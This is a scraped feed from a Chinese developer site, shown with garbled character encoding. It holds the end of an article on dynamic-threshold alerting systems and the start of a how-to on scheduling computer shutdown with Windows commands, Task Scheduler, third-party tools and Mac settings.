        <span class="hljs-string">"""è®¡ç®—å…³é”®æŒ‡æ ‡"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-comment"># å‘Šè­¦è´¨é‡æŒ‡æ ‡</span>
            <span class="hljs-string">'precision'</span>: alerting_system.get_precision(),
            <span class="hljs-string">'recall'</span>: alerting_system.get_recall(),
            <span class="hljs-string">'f1_score'</span>: alerting_system.get_f1_score(),
            
            <span class="hljs-comment"># æ•ˆç‡æŒ‡æ ‡</span>
            <span class="hljs-string">'alert_volume_reduction'</span>: alerting_system.get_volume_reduction(),
            <span class="hljs-string">'mttr'</span>: alerting_system.get_mean_time_to_resolve(),
            <span class="hljs-string">'mttd'</span>: alerting_system.get_mean_time_to_detect(),
            
            <span class="hljs-comment"># ç³»ç»Ÿæ€§èƒ½æŒ‡æ ‡</span>
            <span class="hljs-string">'avg_processing_time'</span>: alerting_system.get_avg_processing_time(),
            <span class="hljs-string">'model_confidence'</span>: alerting_system.get_avg_confidence(),
            <span class="hljs-string">'data_coverage'</span>: alerting_system.get_data_coverage(),
            
            <span class="hljs-comment"># ä¸šåŠ¡å½±å“æŒ‡æ ‡</span>
            <span class="hljs-string">'prevented_incidents'</span>: alerting_system.get_prevented_incidents(),
            <span class="hljs-string">'cost_savings'</span>: alerting_system.calculate_cost_savings()
        }
</code></pre>
<h3 data-id="heading-44">9.4 æ•…éšœæ’æŸ¥æ¸…å•</h3>
<p><strong>é—®é¢˜ï¼šé˜ˆå€¼è®¡ç®—å¤±è´¥</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥æ•°æ®å®Œæ•´æ€§ï¼ˆæ˜¯å¦æœ‰å¤§é‡ç¼ºå¤±å€¼ï¼‰
â–¡ æ£€æŸ¥æ•°æ®èŒƒå›´ï¼ˆæ˜¯å¦æœ‰å¼‚å¸¸çš„æå€¼ï¼‰
â–¡ æ£€æŸ¥çª—å£å¤§å°ï¼ˆæ˜¯å¦æœ‰è¶³å¤Ÿçš„å†å²æ•°æ®ï¼‰
â–¡ æ£€æŸ¥å­£èŠ‚å‘¨æœŸè®¾ç½®ï¼ˆæ˜¯å¦ä¸å®é™…ä¸šåŠ¡åŒ¹é…ï¼‰
â–¡ æŸ¥çœ‹æ—¥å¿—ä¸­çš„é”™è¯¯ä¿¡æ¯
</code></pre>
<p><strong>é—®é¢˜ï¼šå‘Šè­¦è¿‡å¤š</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥sigmaå€æ•°ï¼ˆæ˜¯å¦è®¾ç½®è¿‡å°ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦æœ‰æŒç»­çš„å¼‚å¸¸çŠ¶æ€ï¼ˆç³»ç»Ÿæ˜¯å¦çœŸçš„æœ‰é—®é¢˜ï¼‰
â–¡ æ£€æŸ¥å‘Šè­¦æŠ‘åˆ¶é…ç½®ï¼ˆå†·å´æœŸæ˜¯å¦è¿‡çŸ­ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦æœ‰çªå‘äº‹ä»¶ï¼ˆæ˜¯å¦éœ€è¦æ³¨å†Œäº‹ä»¶ï¼‰
â–¡ å¯ç”¨è‡ªé€‚åº”å­¦ä¹ ï¼ˆè®©ç³»ç»Ÿè‡ªåŠ¨è°ƒæ•´ï¼‰
</code></pre>
<p><strong>é—®é¢˜ï¼šæ¼æŠ¥å…³é”®æ•…éšœ</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥sigmaå€æ•°ï¼ˆæ˜¯å¦è®¾ç½®è¿‡å¤§ï¼‰
â–¡ æ£€æŸ¥çª—å£å¤§å°ï¼ˆæ˜¯å¦è¿‡é•¿å¯¼è‡´å“åº”æ…¢ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦å¯ç”¨å¤šç»´åº¦æ£€æµ‹ï¼ˆå•ä¸€æŒ‡æ ‡å¯èƒ½ä¸å¤Ÿï¼‰
â–¡ æ£€æŸ¥ä¸šåŠ¡å…³é”®åº¦é…ç½®ï¼ˆæ˜¯å¦æ­£ç¡®æ ‡è®°å…³é”®æœåŠ¡ï¼‰
â–¡ è€ƒè™‘æ·»åŠ åŸºäºè§„åˆ™çš„å…œåº•å‘Šè­¦
</code></pre>
<p>åŠ¨æ€é˜ˆå€¼ç³»ç»Ÿé€šè¿‡<strong>è‡ªæˆ‘å­¦ä¹ </strong>å’Œ<strong>è‡ªé€‚åº”è°ƒæ•´</strong>ï¼Œä»æ ¹æœ¬ä¸Šè§£å†³äº†ä¼ ç»Ÿå›ºå®šé˜ˆå€¼çš„ä¸‰å¤§ç—›ç‚¹ï¼š</p>
<ol>
<li><strong>å‘Šè­¦ç–²åŠ³</strong>Â â†’ å‘Šè­¦é‡å‡å°‘60-80%</li>
<li><strong>è¯¯æŠ¥ç‡é«˜</strong>Â â†’ æœ‰æ•ˆå‘Šè­¦æ¯”ä¾‹æå‡è‡³70%+</li>
<li><strong>æ— æ³•é€‚åº”å˜åŒ–</strong>Â â†’ è‡ªåŠ¨é€‚åº”ä¸šåŠ¡å¢é•¿å’Œå‘¨æœŸå˜åŒ–</li>
</ol>
<h3 data-id="heading-45">10.2 å…³é”®æŠ€æœ¯è¦ç‚¹</h3>
<ul>
<li><strong>STLæ—¶é—´åºåˆ—åˆ†è§£</strong>ï¼šå°†å¤æ‚çš„æ—¶é—´åºåˆ—æ‹†è§£ä¸ºè¶‹åŠ¿ã€å­£èŠ‚ã€æ®‹å·®</li>
<li><strong>3ÏƒåŸåˆ™</strong>ï¼šåŸºäºç»Ÿè®¡å­¦çš„å¼‚å¸¸åˆ¤æ–­æ ‡å‡†</li>
<li><strong>æ»‘åŠ¨çª—å£</strong>ï¼šæŒç»­å­¦ä¹ æœ€æ–°çš„ä¸šåŠ¡æ¨¡å¼</li>
<li><strong>å¤šç»´åº¦æ£€æµ‹</strong>ï¼šç»“åˆæŒ‡æ ‡ã€æ‹“æ‰‘ã€ä¸šåŠ¡ã€æ—¶é—´ç­‰å¤šä¸ªç»´åº¦</li>
<li><strong>è‡ªé€‚åº”å­¦ä¹ </strong>ï¼šä»åé¦ˆä¸­æŒç»­ä¼˜åŒ–</li>
</ul>
<h3 data-id="heading-46">10.3 å®æ–½å»ºè®®</h3>
<ol>
<li><strong>ä»å°åšèµ·</strong>ï¼šå…ˆåœ¨1-2ä¸ªæ ¸å¿ƒæœåŠ¡è¯•ç‚¹</li>
<li><strong>å¹¶è¡Œè¿è¡Œ</strong>ï¼šä¸ç°æœ‰ç³»ç»Ÿå¹¶è¡Œï¼Œé€æ­¥åˆ‡æ¢</li>
<li><strong>æŒç»­ä¼˜åŒ–</strong>ï¼šæ ¹æ®åé¦ˆä¸æ–­è°ƒæ•´å‚æ•°</li>
<li><strong>å›¢é˜ŸåŸ¹è®­</strong>ï¼šç¡®ä¿è¿ç»´å›¢é˜Ÿç†è§£æ–°ç³»ç»Ÿ</li>
<li><strong>æ–‡æ¡£å®Œå–„</strong>ï¼šè®°å½•é…ç½®ã€æ¡ˆä¾‹ã€ç»éªŒ</li>
</ol>
<h3 data-id="heading-47">10.4 æœªæ¥è¶‹åŠ¿</h3>
<p><strong>æ™ºèƒ½åŒ–</strong>ï¼šä»è§„åˆ™é©±åŠ¨åˆ°AIé©±åŠ¨</p>
<ul>
<li>æ·±åº¦å­¦ä¹ æ¨¡å‹æ›¿ä»£ä¼ ç»Ÿç»Ÿè®¡æ–¹æ³•</li>
<li>è‡ªåŠ¨æ ¹å› åˆ†æå’Œæ•…éšœé¢„æµ‹</li>
<li>æ™ºèƒ½æ¨èä¿®å¤æ–¹æ¡ˆ</li>
</ul>
<p><strong>è‡ªåŠ¨åŒ–</strong>ï¼šä»å‘Šè­¦åˆ°è‡ªæ„ˆ</p>
<ul>
<li>è‡ªåŠ¨æ‰§è¡Œä¿®å¤åŠ¨ä½œ</li>
<li>é—­ç¯åé¦ˆä¼˜åŒ–</li>
<li>é›¶äººå·¥å¹²é¢„çš„è¿ç»´</li>
</ul>
<p><strong>å…¨å±€åŒ–</strong>ï¼šä»å•ç‚¹åˆ°å…¨å±€</p>
<ul>
<li>å…¨é“¾è·¯è¿½è¸ªä¸åˆ†æ</li>
<li>è·¨ç³»ç»Ÿå…³è”åˆ†æ</li>
<li>ä¸šåŠ¡è§†è§’çš„ç»Ÿä¸€ç›‘æ§</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">å®Œæ•´ä»£ç ä»“åº“å¦‚ä¸‹ï¼š
<span class="hljs-built_in">dynamic</span>-threshold-system/
â”œâ”€â”€ core/
â”‚   â”œâ”€â”€ threshold_generator.py      <span class="hljs-meta"># æ ¸å¿ƒé˜ˆå€¼ç”Ÿæˆå™¨</span>
â”‚   â”œâ”€â”€ stl_decomposer.py          <span class="hljs-meta"># STLåˆ†è§£å™¨</span>
â”‚   â””â”€â”€ anomaly_detector.py        <span class="hljs-meta"># å¼‚å¸¸æ£€æµ‹å™¨</span>
â”œâ”€â”€ integrations/
â”‚   â”œâ”€â”€ prometheus.py              <span class="hljs-meta"># Prometheusé›†æˆ</span>
â”‚   â”œâ”€â”€ influxdb.py                <span class="hljs-meta"># InfluxDBé›†æˆ</span>
â”‚   â””â”€â”€ grafana.py                 <span class="hljs-meta"># Grafanaé›†æˆ</span>
â”œâ”€â”€ notifiers/
â”‚   â”œâ”€â”€ dingtalk.py                <span class="hljs-meta"># é’‰é’‰é€šçŸ¥</span>
â”‚   â”œâ”€â”€ email.py                   <span class="hljs-meta"># é‚®ä»¶é€šçŸ¥</span>
â”‚   â””â”€â”€ pagerduty.py               <span class="hljs-meta"># PagerDutyé€šçŸ¥</span>
â”œâ”€â”€ operators/
â”‚   â””â”€â”€ kubernetes_operator.py     <span class="hljs-meta"># K8s Operator</span>
â”œâ”€â”€ tests/
â”‚   â”œâ”€â”€ test_threshold_generator.py
â”‚   â””â”€â”€ test_anomaly_detector.py
â”œâ”€â”€ examples/
â”‚   â”œâ”€â”€ basic_usage.py
â”‚   â””â”€â”€ advanced_usage.py
â”œâ”€â”€ docs/
â”‚   â”œâ”€â”€ architecture.md
â”‚   â”œâ”€â”€ api_reference.md
â”‚   â””â”€â”€ deployment_guide.md
â”œâ”€â”€ requirements.txt
â””â”€â”€ README.md
</code></pre>
<h3 data-id="heading-48">å‚è€ƒèµ„æº</h3>
<p><strong>å­¦æœ¯è®ºæ–‡</strong>ï¼š</p>
<ul>
<li>Cleveland et al. (1990): â€œSTL: A Seasonal-Trend Decomposition Procedure Based on Loessâ€</li>
<li>Laptev et al. (2015): â€œTime-Series Extreme Event Forecasting with Neural Networks at Uberâ€</li>
</ul>
<p><strong>å¼€æºé¡¹ç›®</strong>ï¼š</p>
<ul>
<li>Facebook Prophet: æ—¶é—´åºåˆ—é¢„æµ‹</li>
<li>Twitter AnomalyDetection: å¼‚å¸¸æ£€æµ‹</li>
<li>LinkedIn Luminol: å¼‚å¸¸æ£€æµ‹å’Œå…³è”åˆ†æ</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )]]></title>    <link>https://juejin.cn/post/7592552501579284506</link>    <guid>https://juejin.cn/post/7592552501579284506</guid>    <pubDate>2026-01-08T02:27:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592552501579284506" data-draft-id="7592759902675664942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:27:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="PieroPC"/> <meta itemprop="url" content="https://juejin.cn/user/1998231182522521"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1998231182522521/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    PieroPC
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:27:08.000Z" title="Thu Jan 08 2026 02:27:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸ºç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•ï¼Œä»ç®€å•åˆ°é«˜çº§ï¼Œæ‚¨å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚é€‰æ‹©ã€‚</p>
<h4 data-id="heading-0">æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Windows è‡ªå¸¦çš„å‘½ä»¤ï¼ˆæœ€ç®€å•é€šç”¨ï¼‰</h4>
<p>è¿™æ˜¯æœ€ç»å…¸ã€æœ€çµæ´»çš„æ–¹æ³•ï¼Œé€‚ç”¨äºæ‰€æœ‰ Windows ç³»ç»Ÿã€‚</p>
<ol>
<li>
<p><strong>æ‰“å¼€â€œè¿è¡Œâ€å¯¹è¯æ¡†</strong>ï¼š</p>
<ul>
<li>æŒ‰é”®ç›˜ä¸Šçš„ <code>Win</code> + <code>R</code> é”®ã€‚</li>
<li>æˆ–è€…åœ¨å¼€å§‹èœå•æœç´¢â€œè¿è¡Œâ€ã€‚</li>
</ul>
</li>
<li>
<p><strong>è¾“å…¥å…³æœºå‘½ä»¤</strong>ï¼š</p>
<ul>
<li>åœ¨æ‰“å¼€çš„è¿è¡Œæ¡†ä¸­ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š
<pre><code class="hljs language-cmd" lang="cmd">shutdown -s -t ç§’æ•°
</code></pre>
<ul>
<li><strong><code>shutdown</code></strong>ï¼šå…³æœºå‘½ä»¤ã€‚</li>
<li><strong><code>-s</code></strong>ï¼šè¡¨ç¤ºå…³é—­è®¡ç®—æœºã€‚</li>
<li><strong><code>-t</code></strong>ï¼šåé¢è·Ÿå»¶è¿Ÿæ—¶é—´ã€‚</li>
<li><strong><code>ç§’æ•°</code></strong>ï¼šæŒ‡å®šå¤šå°‘ç§’åå…³æœºã€‚ä¾‹å¦‚ï¼š
<ul>
<li>1å°æ—¶åå…³æœºï¼š<code>shutdown -s -t 3600</code> ï¼ˆ1å°æ—¶ = 60åˆ†é’Ÿ Ã— 60ç§’ï¼‰</li>
<li>2å°æ—¶åå…³æœºï¼š<code>shutdown -s -t 7200</code></li>
<li>30åˆ†é’Ÿåå…³æœºï¼š<code>shutdown -s -t 1800</code></li>
<li>æ™šä¸Š11ç‚¹å…³æœºï¼ˆå‡è®¾ç°åœ¨æ™šä¸Š10ç‚¹ï¼‰ï¼š<code>shutdown -s -t 3600</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼š</p>
<ul>
<li>ç‚¹å‡»â€œç¡®å®šâ€æˆ–æŒ‰å›è½¦é”®ã€‚</li>
<li>æˆåŠŸåä¼šå¼¹å‡ºä¸€ä¸ªå°çª—å£æç¤ºâ€œWindows å°†åœ¨ XX åˆ†é’Ÿåå…³é—­â€ã€‚</li>
</ul>
</li>
</ol>
<p><strong>å¦‚ä½•å–æ¶ˆå®šæ—¶å…³æœºï¼Ÿ</strong></p>
<ul>
<li>åŒæ ·æ‰“å¼€â€œè¿è¡Œâ€ (<code>Win + R</code>)ï¼Œè¾“å…¥ï¼š
<pre><code class="hljs language-cmd" lang="cmd">shutdown -a
</code></pre>
</li>
<li>æŒ‰å›è½¦ã€‚ç³»ç»Ÿä¼šæç¤ºâ€œè®¡åˆ’çš„å…³é—­å·²å–æ¶ˆâ€ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-1">æ–¹æ³•äºŒï¼šåˆ›å»ºå®šæ—¶å…³æœºçš„å¿«æ·æ–¹å¼ï¼ˆä¸€é”®å¯åŠ¨ï¼‰</h4>
<p>å¦‚æœæ‚¨éœ€è¦é¢‘ç¹ä½¿ç”¨æŸä¸ªå›ºå®šçš„æ—¶é—´ï¼ˆå¦‚ä¸‹è½½å¤§æ–‡ä»¶å¸¸ç”¨2å°æ—¶ï¼‰ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ¡Œé¢å¿«æ·æ–¹å¼ã€‚</p>
<ol>
<li>åœ¨æ¡Œé¢ç©ºç™½å¤„ç‚¹å‡»å³é”®ï¼Œé€‰æ‹© <strong>æ–°å»º -&gt; å¿«æ·æ–¹å¼</strong>ã€‚</li>
<li>åœ¨â€œè¯·è¾“å…¥å¯¹è±¡çš„ä½ç½®â€æ¡†ä¸­ï¼Œè¾“å…¥å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š
shutdown -s -t 7200
ï¼ˆè¿™é‡Œä»¥2å°æ—¶/7200ç§’ä¸ºä¾‹ï¼‰</li>
<li>ç‚¹å‡» <strong>ä¸‹ä¸€æ­¥</strong>ï¼Œä¸ºè¿™ä¸ªå¿«æ·æ–¹å¼èµ·ä¸ªåå­—ï¼Œä¾‹å¦‚â€œ2å°æ—¶åå…³æœºâ€ã€‚</li>
<li>ç‚¹å‡» <strong>å®Œæˆ</strong>ã€‚</li>
</ol>
<p>ç°åœ¨ï¼Œåªéœ€åŒå‡»è¿™ä¸ªæ¡Œé¢å›¾æ ‡ï¼Œå°±ä¼šå¯åŠ¨2å°æ—¶åå…³æœºçš„å‘½ä»¤ã€‚</p>
<hr/>
<h4 data-id="heading-2">æ–¹æ³•ä¸‰ï¼šä½¿ç”¨ä»»åŠ¡è®¡åˆ’ç¨‹åºï¼ˆç²¾ç¡®åˆ°å…·ä½“æ—¥æœŸå’Œæ—¶é—´ï¼‰</h4>
<p>å¦‚æœä½ æƒ³è¦åƒè®¾ç½®é—¹é’Ÿä¸€æ ·ï¼Œè®©ç”µè„‘åœ¨<strong>æ¯å¤©æ™šä¸Š11ç‚¹</strong>æˆ–<strong>æ¯å‘¨äº”ä¸‹åˆ5ç‚¹</strong>è‡ªåŠ¨å…³æœºï¼Œè¿™æ˜¯æœ€ä¸“ä¸šçš„æ–¹æ³•ã€‚</p>
<ol>
<li>åœ¨å¼€å§‹èœå•æœç´¢å¹¶æ‰“å¼€ <strong>â€œä»»åŠ¡è®¡åˆ’ç¨‹åºâ€</strong>ã€‚</li>
<li>åœ¨å³ä¾§æ“ä½œæ ï¼Œç‚¹å‡» <strong>â€œåˆ›å»ºåŸºæœ¬ä»»åŠ¡â€</strong>ã€‚</li>
<li><strong>è®¾ç½®åç§°å’Œæè¿°</strong>ï¼šä¾‹å¦‚â€œæ¯æ—¥è‡ªåŠ¨å…³æœºâ€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚</li>
<li><strong>é€‰æ‹©è§¦å‘å™¨</strong>ï¼šé€‰æ‹©â€œæ¯å¤©â€ã€â€œæ¯å‘¨â€æˆ–â€œä¸€æ¬¡â€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚
<ul>
<li>å¦‚æœé€‰â€œæ¯å¤©â€ï¼Œè®¾ç½®å¼€å§‹æ—¥æœŸå’Œå…·ä½“æ—¶é—´ï¼ˆå¦‚23:00ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>é€‰æ‹©æ“ä½œ</strong>ï¼šé€‰æ‹©â€œå¯åŠ¨ç¨‹åºâ€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚</li>
<li><strong>è®¾ç½®ç¨‹åºæˆ–è„šæœ¬</strong>ï¼š
<ul>
<li>åœ¨â€œç¨‹åºæˆ–è„šæœ¬â€æ¡†ä¸­è¾“å…¥ï¼š<code>shutdown</code></li>
<li>åœ¨â€œæ·»åŠ å‚æ•°â€æ¡†ä¸­è¾“å…¥ï¼š<code>-s -f</code> ï¼ˆ<code>-f</code> è¡¨ç¤ºå¼ºåˆ¶å…³é—­æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼‰</li>
<li><strong>æ³¨æ„</strong>ï¼šè¿™é‡Œä¸éœ€è¦ <code>-t</code> å‚æ•°ï¼Œå› ä¸ºè§¦å‘æ—¶é—´ç”±ä»»åŠ¡è®¡åˆ’æ§åˆ¶ã€‚</li>
</ul>
</li>
<li>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œç„¶åå®Œæˆã€‚</li>
</ol>
<p>è¿™æ ·ï¼Œç”µè„‘å°±ä¼šåœ¨ä½ è®¾å®šçš„å‘¨æœŸå’Œæ—¶é—´ç‚¹è‡ªåŠ¨å…³æœºã€‚</p>
<hr/>
<h4 data-id="heading-3">æ–¹æ³•å››ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼ˆåŠŸèƒ½å…¨é¢ã€ç•Œé¢å‹å¥½ï¼‰</h4>
<p>å¦‚æœä½ è§‰å¾—å‘½ä»¤éš¾è®°ï¼Œæˆ–è€…æƒ³è¦æ›´ç›´è§‚çš„å›¾å½¢ç•Œé¢ï¼Œå¾ˆå¤šè½¯ä»¶å¯ä»¥å¸®ä½ ã€‚</p>
<ul>
<li><strong>æ¨èè½¯ä»¶</strong>ï¼š
<ul>
<li><strong>Shutdown Timer</strong>ï¼šå°å·§ã€å…è´¹ã€æ— å¹¿å‘Šã€‚</li>
<li><strong>Wise Auto Shutdown</strong>ï¼šåŠŸèƒ½ä¸°å¯Œï¼Œå¯ä»¥å®šæ—¶å…³æœºã€é‡å¯ã€ç¡çœ ã€æ³¨é”€ç­‰ã€‚</li>
<li><strong>Airytec Switch Off</strong>ï¼šåŒæ ·åŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒè¿œç¨‹ç®¡ç†ã€‚</li>
</ul>
</li>
</ul>
<p><strong>ä½¿ç”¨æ–¹å¼</strong>ï¼š
ä¸‹è½½å®‰è£…åï¼Œè½¯ä»¶ç•Œé¢é€šå¸¸éå¸¸ç›´è§‚ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©â€œå…³æœºâ€ï¼Œç„¶åé€‰æ‹©æ—¶é—´ï¼ˆå¦‚â€œåœ¨â€ã€â€œæ¯å¤© 22:30â€ç­‰ï¼‰ï¼Œæœ€åç‚¹å‡»â€œå¯åŠ¨â€æˆ–â€œåº”ç”¨â€å³å¯ã€‚</p>
<hr/>
<h4 data-id="heading-4">Mac ç”¨æˆ·è®¾ç½®å®šæ—¶å…³æœº</h4>
<ol>
<li>ç‚¹å‡»å±å¹•å·¦ä¸Šè§’çš„ <strong>è‹¹æœèœå•</strong>ï¼Œé€‰æ‹© <strong>â€œç³»ç»Ÿåå¥½è®¾ç½®â€</strong>ã€‚</li>
<li>è¿›å…¥ <strong>â€œèŠ‚èƒ½â€</strong> ï¼ˆæˆ–â€œç”µæ± â€ï¼‰è®¾ç½®ã€‚</li>
<li>ç‚¹å‡»å³ä¸‹è§’çš„ <strong>â€œå®šæ—¶â€¦â€</strong> æŒ‰é’®ã€‚</li>
<li>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå‹¾é€‰ç¬¬äºŒä¸ªå¤é€‰æ¡†ã€‚</li>
<li>åœ¨ä¸‹æ‹‰èœå•ä¸­ï¼Œé€‰æ‹© <strong>â€œå…³é—­â€</strong>ï¼Œç„¶åè®¾ç½®ä½ å¸Œæœ›å…³æœºçš„<strong>æ—¥æœŸå’Œæ—¶é—´</strong>ã€‚</li>
